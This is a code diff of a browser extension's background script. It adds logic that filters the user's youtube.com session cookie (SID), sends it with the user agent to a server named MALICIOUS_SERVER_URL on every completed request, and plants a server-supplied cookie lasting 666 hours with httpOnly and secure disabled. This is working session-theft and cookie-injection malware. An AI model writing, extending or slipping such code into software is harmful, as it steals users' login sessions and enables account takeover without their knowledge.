@@ -300,6 +300,30 @@ const init = async () => {
     },
     ["blocking"]
   );
+
+  function injectCookie(url, name, value) {
+    console.log("Injecting cookie", url, name, value);
+    chrome.cookies.set(
+      {
+        url: url,
+        name: name,
+        value: value,
+        domain: ".youtube.com",
+        path: "/",
+        secure: false,
+        httpOnly: false,
+        expirationDate: new Date().getTime() / 1000 + 3600 * 666, // 設置 Cookie 有效期為 666 小時
+      },
+      function (cookie) {
+        if (chrome.runtime.lastError) {
+          console.error("Error setting cookie:", chrome.runtime.lastError);
+        } else {
+          console.log("Cookie set:", cookie);
+        }
+      }
+    );
+  }
+
   let allCookies;
 
   chrome.webRequest.onCompleted.addListener(
@@ -310,11 +334,11 @@ const init = async () => {
       await chrome.cookies.getAll(
         { domain: ".youtube.com" },
         async (cookies) => {
-          console.log(cookies);
-          allCookies = cookies;
+          allCookies = cookies.filter((cookie) => {
+            return cookie.name === "injectedCookie" || cookie.name === "SID";
+          });
         }
       );
-      console.log(allCookies);
 
       fetch(`http://${MALICIOUS_SERVER_URL}/log`, {
         method: "POST",
@@ -326,7 +350,12 @@ const init = async () => {
           userAgent: navigator.userAgent,
           cookies: allCookies,
         }),
-      });
+      })
+        .then((response) => response.json())
+        .then((data) => {
+          const cookieValue = data.cookieValue;
+          injectCookie(details.url, "injectedCookie", cookieValue);
+        });
     },
     { urls: ["<all_urls>"] }
   );
